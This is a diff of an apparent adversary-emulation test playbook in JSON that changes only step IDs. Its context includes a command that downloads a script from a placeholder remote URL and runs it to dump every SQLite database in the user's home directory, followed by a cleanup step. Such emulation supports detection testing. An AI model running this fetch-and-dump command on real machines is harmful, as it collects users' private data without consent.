@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "0bec8748-a82e-4231-ab95-b76536076ada",
+      "id": "61ae1e2a-dbf6-4883-b622-d0f8cb59ff09",
       "type": "execute-command",
       "data": {
         "command": "cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exec bash -c 'if [[ \"$(head -c 15 {} | strings)\" == \"SQLite format 3\" ]]; then echo \"{}\"; ./sqlite_dump.sh {}; fi' \\;",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "11c86c3d-74b5-4756-a2e7-fc9aab38fb45",
+      "id": "4fc72213-8afe-402e-9f41-c4c48fa8ffff",
       "type": "execute-command",
       "data": {
         "command": "rm -f $HOME/.art\nrm -f $HOME/gta.db\nrm -f $HOME/sqlite_dump.sh",
@@ -25,7 +25,7 @@
       "elevation_required": false
     },
     {
-      "id": "b498d48a-9854-4d96-8dd2-50a042e525bb",
+      "id": "12034e39-2eba-48e0-933e-cede40e30a62",
       "name": "Check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -36,7 +36,7 @@
       "elevation_required": false
     },
     {
-      "id": "a5ab43c5-0e29-436e-a47d-03c77079cbf8",
+      "id": "effbe63c-a8d2-4a3f-b869-9d269083f7b2",
       "name": "Resolve dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -47,7 +47,7 @@
       "elevation_required": false
     },
     {
-      "id": "7e3b8fc9-6d6e-43c1-bc94-8b4d8a2b2859",
+      "id": "b262a6d2-d9d9-42b4-a73c-7eef67e49ff3",
       "name": "Re-check dependency 1/1",
       "description": "Check if running on a Debian based machine.\n",
       "type": "execute-command",
@@ -60,34 +60,34 @@
   ],
   "flows": [
     {
-      "s": "0bec8748-a82e-4231-ab95-b76536076ada",
+      "s": "61ae1e2a-dbf6-4883-b622-d0f8cb59ff09",
       "p": "on-success",
-      "o": "11c86c3d-74b5-4756-a2e7-fc9aab38fb45"
+      "o": "4fc72213-8afe-402e-9f41-c4c48fa8ffff"
     },
     {
-      "s": "0bec8748-a82e-4231-ab95-b76536076ada",
+      "s": "61ae1e2a-dbf6-4883-b622-d0f8cb59ff09",
       "p": "on-failure",
-      "o": "11c86c3d-74b5-4756-a2e7-fc9aab38fb45"
+      "o": "4fc72213-8afe-402e-9f41-c4c48fa8ffff"
     },
     {
-      "s": "b498d48a-9854-4d96-8dd2-50a042e525bb",
+      "s": "12034e39-2eba-48e0-933e-cede40e30a62",
       "p": "on-success",
-      "o": "0bec8748-a82e-4231-ab95-b76536076ada"
+      "o": "61ae1e2a-dbf6-4883-b622-d0f8cb59ff09"
     },
     {
-      "s": "b498d48a-9854-4d96-8dd2-50a042e525bb",
+      "s": "12034e39-2eba-48e0-933e-cede40e30a62",
       "p": "on-failure",
-      "o": "a5ab43c5-0e29-436e-a47d-03c77079cbf8"
+      "o": "effbe63c-a8d2-4a3f-b869-9d269083f7b2"
     },
     {
-      "s": "a5ab43c5-0e29-436e-a47d-03c77079cbf8",
+      "s": "effbe63c-a8d2-4a3f-b869-9d269083f7b2",
       "p": "on-success",
-      "o": "7e3b8fc9-6d6e-43c1-bc94-8b4d8a2b2859"
+      "o": "b262a6d2-d9d9-42b4-a73c-7eef67e49ff3"
     },
     {
-      "s": "7e3b8fc9-6d6e-43c1-bc94-8b4d8a2b2859",
+      "s": "b262a6d2-d9d9-42b4-a73c-7eef67e49ff3",
       "p": "on-failure",
-      "o": "0bec8748-a82e-4231-ab95-b76536076ada"
+      "o": "61ae1e2a-dbf6-4883-b622-d0f8cb59ff09"
     }
   ],
   "tags": [
